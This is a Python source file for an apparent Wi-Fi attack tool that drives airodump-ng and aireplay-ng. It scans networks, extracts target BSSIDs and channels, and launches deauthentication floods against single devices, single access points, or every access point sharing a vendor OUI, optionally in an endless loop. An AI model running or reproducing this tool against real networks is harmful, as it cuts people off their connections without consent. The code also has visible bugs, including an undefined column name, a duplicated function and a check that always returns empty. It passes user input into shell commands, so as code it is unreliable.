import glob
import os
import random
import signal
import string
import subprocess
import time
import csv
import pandas as pd


def clear():
    subprocess.run('clear')


def ansi_escape_red(string):
    return f'\033[91m{string}\033[0m'


def ansi_escape_green(string):
    return f'\033[92m{string}\033[0m'


# TODO do not depend on global variables
bssid_of_targetAP = 'not found'
channel_of_targetAP = 'not found'
terminals = ['x-terminal-emulator', 'gnome-terminal', 'konsole', 'xfce4-terminal']
DeauthTimeout = 0  # if this is 0 then there wont be a timeout, if its any integer other than 0 it will timeout after that integer, timeout is set in some scripts and cleared after that script runs to not cause any issues. timeout is used when multiple APs are targeted

def scan_for_networks(interface):
    def recursion():
        selection = input('Rerun the Scan  Y/N ').lower()
        while selection != 'y' or selection != 'n':
            if selection == 'y':
                scan_for_networks(interface)
            elif selection == 'n':
                print(
                    '==================================================================================================\n')
                print(
                    f'this message is from {ansi_escape_green("scan_for_networks")} No {ansi_escape_red("Network AP")} will be returned this may cause issues if this function was called from another function \n')
                return
            else:
                recursion()
            return
    print('Airodump is running. Wait a while for it to complete')
    airodump = subprocess.Popen('airodump-ng {}'.format(interface), shell=True,
                                preexec_fn=os.setsid, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    # kill airodump after 10 seconds
    time.sleep(10)
    clear()
    os.killpg(airodump.pid, signal.SIGTERM)
    # .communicate() waits for the process to be completed. so it won't run until 'os.killpg(airodump.pid, signal.SIGTERM)' is successful.
    output,error = airodump.communicate()
    if isinstance(output, bytes):
        output = output.decode(encoding='latin-1')
        print(output)
        print('==================================================================================================\n')
        # Isolate ESSID column and check row[10] to match AP with the input
        while 1:
            targetAP = input(' Select a AP (SSID/ESSID) : ')
            for row in output.split('\n'):
                column = row.split()
                if len(column) >= 12 and (targetAP == column[10]):
                    return targetAP
            if targetAP == '999':
                return
            else:
                print(f'Selected AP ({ansi_escape_green(targetAP)}) does not exist. was it a mistype?')
                print(f'Type {ansi_escape_green("999")} to cancel AP selection')
    else:
        error.decode(encoding='latin-1')
        print(f'there was a issue running {ansi_escape_red("airodump-ng")}, check interface. if everything is okay rerun')
        print(f'ERROR {ansi_escape_red(error)}')
        recursion()

def get_BSSID_and_Station_from_AP(interface, targetAP):
    def recursion():
        selection = input('Rerun the Scan  Y/N ').lower()
        while selection != 'y' or selection != 'n':
            if selection == 'y':
                scan_devices_in_AP(interface, targetAP)
            elif selection == 'n':
                print(
                    '==================================================================================================\n')
                print(
                    f'this message is from {ansi_escape_green("get_BSSID_and_Station_from_AP")} No {ansi_escape_red("BSSID")} and {ansi_escape_red("CHANNEL")} will be returned this may cause issues if this function was called from another function \n')
                return  # this return is not enoguh on its own because when recursion is used return will return to the parent of that recursive function
                # so if we input 'Y' for 10 times we would need to input 'N' 10 times to actually return to the first function call
            else:
                recursion()
            return  # that's why we have a return here so that it returns to the first function call

    # save the output and error from airodump to variables
    print('Airodump is running. Wait a while for it to complete')
    airodump = subprocess.Popen('airodump-ng {}'.format(interface), shell=True,
                                preexec_fn=os.setsid, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    # kill airodump after 10 seconds
    time.sleep(5)
    clear()
    os.killpg(airodump.pid, signal.SIGTERM)
    # .communicate() waits for the process to be completed. so it won't run until 'os.killpg(airodump.pid, signal.SIGTERM)' is successful.
    output, error = airodump.communicate()

    if isinstance(output, bytes):
        # there was an issue with the output and error, when ---> output = output.decode(encoding='utf-8') it gives ---> UnicodeDecodeError, invalid continuation byte
        # the solution is changing the encoding from 'utf-8' to 'latin-1'
        output = output.decode(encoding='latin-1')
    else:
        print('there was a issue running Airodump, check interface. if everything is okay rerun')
        recursion()

    print(output)
    print('==================================================================================================\n')

    # check if airodump found the target AP or not
    if targetAP not in output:
        # IF AN ERROR CAUSED TARGET AP TO BE NOT FOUND IN THE AIRODUMP DATA THEN THIS WILL RUN (example: inteface not found)
        if isinstance(error, bytes):
            error = error.decode(encoding='latin-1')
            if error:
                print(
                    f' There was an error with the airodump-ng. If you see networks listed above then there is no serious issue. Otherwise check the interface and the error')
                print(
                    f' Generally If you are seeing this then its a issue with the interface either its disconnected or you given a wrong name for the interface \n')
                # TODO do not allow selecting interfaces that are not on the output of ip link show
                print(f'ERROR: {ansi_escape_red(error)}')

        # IF NO ERRORS OCCOURED AND NETWORK SCAN WAS SUCCESSFUL BUT TARGET AP WAS NOT ON THE SCANNED NETWORK LIST THEN THIS WILL RUN
        print('==================================================================================================\n')
        print(f'{ansi_escape_green(targetAP)} was not found in scanned networks \n')
        print('But If you are seeing the networks then check connectivity of AP \n')
        recursion()
    # if airodump was successful in finding the targetAP
    else:
        targetAP_channel = ''
        targetAP_BSSID = ''
        # with split.('\n') make the output format in to lines/rows
        # this for loop will check each line going down
        for row in output.split('\n'):
            column = row.split()
            # the use of row.split() places comma ',' instead of all empty space
            # the column looks like this for nearly all APs when using airodump
            # ['BSSID', 'PWR', 'BEACONS', 'DATA', '/s', 'CHANNEL', '360', 'ENCRYPTION', 'CIPHER', 'AUTH', 'ESSID', '\x1b[0K']
            # but airodump records contain other things as well, so first we need to be sure it matches this pattern
            if len(column) >= 12 and (targetAP == column[10]) and ((column[0] and column[5]) != ''):
                targetAP_BSSID = column[0]
                targetAP_channel = column[5]
                print(
                    f' Target BSSID {ansi_escape_green(targetAP_BSSID)} \n CHANNEL {ansi_escape_green(targetAP_channel)}  \n AP {ansi_escape_green(targetAP)} \n \n Listing '
                    f'Devices in this AP Please Wait')
                return targetAP_BSSID, targetAP_channel
    return


def process_ssids(file_name):
    df = pd.read_csv(file_name, header=None)
    df.columns = ['bssid', 'ESSID']
    current_oui = None
    for index, row in df.iterrows():
        oui = row['bssid'][:8]
        if oui != current_oui:
            if current_oui:
                print()
            current_oui = oui
            print(f'OUI: {oui}')
        print(f'  - {row["ssid"]} ({row["bssid"]})')


# TODO
def scan_for_networks_by_OUI(interface):
    random_output_file_name = ''.join(random.choice(string.ascii_letters) for _ in range(32))
    random_filtered_output_file_name = ''.join(random.choice(string.ascii_letters) for _ in range(32))
    print('{}.csv'.format(random_filtered_output_file_name))

    # subprocess.run('airodump-ng {} -w /tmp/{}  --output-format csv &'.format(interface, random_output_file_name),shell=True)
    airodump = subprocess.Popen(
        'airodump-ng {} -w /tmp/{}  --output-format csv &'.format(interface, random_output_file_name), shell=True,
        preexec_fn=os.setsid)

    time.sleep(0.1)

    csv_output_location = '/tmp/' + random_output_file_name + '-01.csv'
    csv_output = pd.read_csv(csv_output_location)
    csv_outputa = csv_output['BSSID'] + ',' + csv_output[' ESSID']
    csv_formatted_location = f"/tmp/{random_filtered_output_file_name}.csv"
    os.mknod(csv_formatted_location)
    csv_outputa.to_csv(csv_formatted_location, index=False)

    os.killpg(airodump.pid,
              signal.SIGTERM)  # but in order for this to work we also have to add preexec_fn=os.setsid to the airodump argument
    time.sleep(0.5)
    process_ssids(csv_formatted_location)
    os.remove(f'/tmp/{random_output_file_name}-01.csv')  # '-01' becuase airodump adds a postfix to the csv
    os.remove(csv_formatted_location)
    time.sleep(1)
    # return is used for DEAUTH BY OUI selection in network attacks this file will be looped to find APs in the router


# so i couldnt figure out a way to work with my old shell script. instead of using a python method im calling
# a file from ShellScripts and im sending variables from python to shell then im starting script that relies on those variables

def scan_for_networks_by_OUI(interface):
    subprocess.run(['./ShellScripts/OUIFormatter.sh' + ' ' + f'{interface}'], shell=True)


def scan_for_networks_by_OUI_Select_Router(interface):
    subprocess.run(['./ShellScripts/OUIFormatter.sh' + ' ' + f'{interface}'], shell=True)
    return input('Write the OUI of target Router: ')


def retrieve_info_from_latest_networks_csv_file():
    for filename in os.listdir('/tmp/'):
        if filename.startswith('networks-') and filename.endswith('.csv'):
            latest_file = max([f for f in os.listdir('/tmp/') if 'networks-' in f],
                              key=lambda f: os.path.getctime(os.path.join('/tmp/', f)))
            return '/tmp/' + latest_file


def retrieve_information_from_target_using_csv_file(networks_csv_file, targetAP):
    global bssid_of_targetAP
    global channel_of_targetAP
    reader = csv.reader(open(networks_csv_file, 'r'))
    for row in reader:
        # the output of airodump is 15 columns in csv file
        # 0. column is BSSID
        # 3. column is Channel
        # 13. column is ESSID aka targetAP
        # indexes are starting from 0

        # we need channel and BSSID from here
        ESSID_column_index = len(row) - 2
        if ESSID_column_index >= 0 and row[ESSID_column_index].strip() == targetAP:
            # target information is stored in the row[] variable for now and if we want the channel, BSSID we have to return their indexes mentioned above
            print('row[0] ' + row[0])
            print('row[0] ' + row[3])
            if (row[0] or row[3]) != '':
                bssid_of_targetAP = row[0].strip()
                channel_of_targetAP = row[3].strip()


# TODO make it fileless like scan_devices_in_AP()
def Deauth(interface, targetAP):
    global DeauthTimeout
    global bssid_of_targetAP
    global channel_of_targetAP
    print('Gathering information on' + ' ' + ansi_escape_green(targetAP))
    networks_csv_file = retrieve_info_from_latest_networks_csv_file()
    # bssid_of_targetAP, channel_of_targetAP = retrieve_information_from_target_using_csv_file(networks_csv_file,targetAP)
    # turns out decalring multiple variables using a return statement is not avaliable in python although there is a workaround by creating another function...
    # I found it easier to make these variables global so I can declare them inside the method and call here
    retrieve_information_from_target_using_csv_file(networks_csv_file, targetAP)
    if (bssid_of_targetAP or channel_of_targetAP) == 'not found':
        print(
            f' \n {ansi_escape_red(targetAP)} has no BSSID or Channel information cannot continue further check /tmp/networks-*.csv')
    else:
        clear()
        print('Target BSSID found : ' + ansi_escape_green(bssid_of_targetAP))
        print('Target Channel found : ' + ansi_escape_green(channel_of_targetAP))
        print('Switching interface: ' + ansi_escape_green(interface) + ' to channel: ' + ansi_escape_green(
            channel_of_targetAP))
        switch_channel = ['iwconfig ' + interface + ' channel ' + channel_of_targetAP]
        subprocess.Popen(switch_channel, shell=True)

        print('Starting Deauthentication Attack')
        global terminals
        for terminal in terminals:
            try:
                if (DeauthTimeout == 0):
                    # to execute aireplay in new terminal im sending variables to './ShellScripts/aireplay.sh'
                    Deauth_script = './ShellScripts/aireplay.sh'
                    subprocess.run([terminal, f'-e {Deauth_script}', bssid_of_targetAP,
                                    interface])  # just so you know shell=True breaks the use of sudo and wont allow this script to run for who knows why
                elif (DeauthTimeout != 0):
                    # this script is used when we have to close the aireplay terminal and open a new one after a given time interval
                    # time intervals are set in the functions like Deauth_By_OUI
                    # if a time interval is needed instead of aireplay.sh the aireplay_with_interval.sh is used
                    Deauth_script = './ShellScripts/aireplay_with_interval.sh'
                    print(DeauthTimeout)
                    subprocess.run([terminal, f'-e {Deauth_script}', bssid_of_targetAP, interface,
                                    DeauthTimeout])  # this gives error because DeauthTimeout is an integer and it has to be a string value,
                break
            except FileNotFoundError:
                print('no compatible terminal found: install ' + terminal)


# TODO make it fileless like scan_devices_in_AP()
def Deauth_By_OUI(interface, targetOUI):
    global DeauthTimeout  # I selected Deauth to be done in 1minute intervals in this script
    DeauthTimeout = '10'  # its enclosed with '' since we cant send integer with subprocress.run but it gets this variable as an integer IDK WHY but it works
    files = sorted(glob.glob('/tmp/networks-*.csv'))
    latest_file = files[
        -1] if files else '/tmp/networks-01.csv'  ## this else is differnet from the one i used in scan networks because the shell script below will create the /tmp/networks-01.csv in its aireodump function. and if I were to leave it as None like before the script wont run because I pass it as a parameter
    subprocess.run(['./ShellScripts/OUIFormatterKEEPFILE.sh' + ' ' + f'{interface}' + ' ' + f'{latest_file}'],
                   shell=True)  # get csv file
    clear()
    APs_in_OUI = []  # decalre a list to store all APs in OUI
    with open('sorted_ssids.csv', 'r') as f:  # get the row count of entries in csv file
        csv_reader = csv.reader(f)
        for row in csv_reader:  #
            if row[0].startswith(targetOUI) and row[1] != '':  # row[0] means first entrie
                APs_in_OUI.append(row[1])

    APs_in_OUI_Count = len(APs_in_OUI)
    if APs_in_OUI_Count == 0:
        print('This OUI does not belong to any AP please reselect the OUI by typing 3 in Network attacks')
    else:
        selection = 0
        while selection != '1' and selection != '2' and selection != 'exit':
            print(APs_in_OUI_Count, ' APs found in: ', targetOUI)
            print('type 1 to Deauth ALL APs and quit')
            print('type 2 to Deauth ALL APs INDEFINETELY')
            print('type "exit" to quit')
            selection = input('Selection')
        if selection == "exit":
            return
        if selection == '1':
            for i in APs_in_OUI:
                Deauth(interface,
                       i.strip())  # strip is needed otherwise it wont be able to read csv file since variable may have extra space on front of the AP name
        elif selection == '2':
            stop_flag = False  # this is set to lisen for 'q' command from keybaord to stop the loop
            while not stop_flag:
                for i in APs_in_OUI:
                    try:
                        print('Deauthentication Attack has  an INFINITE LOOP.')
                        print('to stop the attack press "ctrl+c" in this terminal. time left 3 seconds')
                        time.sleep(1)
                        print('to stop the attack press "ctrl+c" in this terminal. time left 2 seconds')
                        time.sleep(1)
                        print('to stop the attack press "ctrl+c" in this terminal. time left 1 seconds')
                        time.sleep(1)
                        Deauth(interface, i.strip())
                    except KeyboardInterrupt:
                        stop_flag = True



# this time I'm making a function without the use of csv output file for output management
def scan_devices_in_AP(interface, targetAP):
    try:
        targetAP_BSSID, targetAP_channel = get_BSSID_and_Station_from_AP(interface, targetAP)
        airodump = subprocess.Popen(f'airodump-ng -c {targetAP_channel} --bssid {targetAP_BSSID} {interface}',
                                    shell=True, preexec_fn=os.setsid, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(10)
        clear()
        os.killpg(airodump.pid, signal.SIGTERM)
        output, error = airodump.communicate()
        if isinstance(output, bytes):
            clear()
            output = output.decode(encoding='latin-1')
            print(output + '\n')
        return output
    except TypeError:  # CANT CHECK /if (targetAP_BSSID and targetAP_channel) == None/ PYTHON DOES NOT ALLOW MULTIPLE VARIABLE ASSIGNENTS WITH NONE
        # basically a,b = None is not something that can be done thats why im using try expect. if else throws error
        print('==================================================================================================\n')
        print(f'This message is from {ansi_escape_green("scan_devices_in_AP")}')
        print(f'There is a problem with {ansi_escape_red("get_BSSID_and_Station_from_AP")}')
        input(f'input anything to return to previous function \n')


def scan_devices_in_AP_Select_Device(interface, targetAP):
    # run scan_devices_in_AP(interface,targetAP) to get output of airodump on target AP

    output = scan_devices_in_AP(interface, targetAP)
    if not output:  # in this scenario I expect output to be None and None == false so...
        # also I don't have to use try except TypeError: like I did in scan_devices_in_AP because that error only comes from multiple assignment
        print('==================================================================================================\n')
        print(f'This message is from {ansi_escape_green("scan_devices_in_AP_Select_Device")}')
        print(f'There is a problem with {ansi_escape_red("scan_devices_in_AP")}')
        input('input anything to return to previous function \n')
        return ''
    else:
        clear()
        print(output, '\n')
        target_device = input('type the Station of the target device : ')

        def check_if_selected_device_exist(target_device, output):  # recursion once again :)
            if target_device in output and target_device != '':
                return target_device
            else:
                print(f'{target_device} is not in the devices of this AP. Was it a mistype?')
                target_device = input('Retype the Station (type 999 to return to previous section: ')
                if target_device == '999':
                    return ''
                else:
                    check_if_selected_device_exist(target_device, output)

        check_if_selected_device_exist(target_device, output)
        return ''

def deauth_selected_device(interface, target_device, targetAP):
    try:
        global terminals
        # get bssid and channe;
        targetAP_BSSID, targetAP_channel = get_BSSID_and_Station_from_AP(interface, targetAP)
        # switch to target channel
        switch_channel = subprocess.Popen(f'iwconfig {interface} channel {targetAP_channel}', shell=True)
        switch_channel.wait()


        # run aireplay in seperate terminal
        for terminal in terminals:
            aireplay = subprocess.Popen(f'{terminal} -e aireplay-ng --deauth 0 -a {targetAP_BSSID} -c {target_device} {interface}',shell=True)
            aireplay.wait() # ctrl+c on new terminal (or just closing it) will put the system to this place and then with return it will return to NetworkAttacks menu
            return
    except TypeError:
        print('==================================================================================================\n')
        print(f'This message is from {ansi_escape_green("deauth_selected_device")}')
        print(f'There is a problem with {ansi_escape_red("get_BSSID_and_Station_from_AP")}')
        input(f'input anything to return to previous function \n')


# TODO
def deauth_devices_in_targetAP_with_interval(interface, targetAP):
    # Selection
    # 1) Deauth all devices once and quit
    # 2) Deauth all devices roundrobin
    return
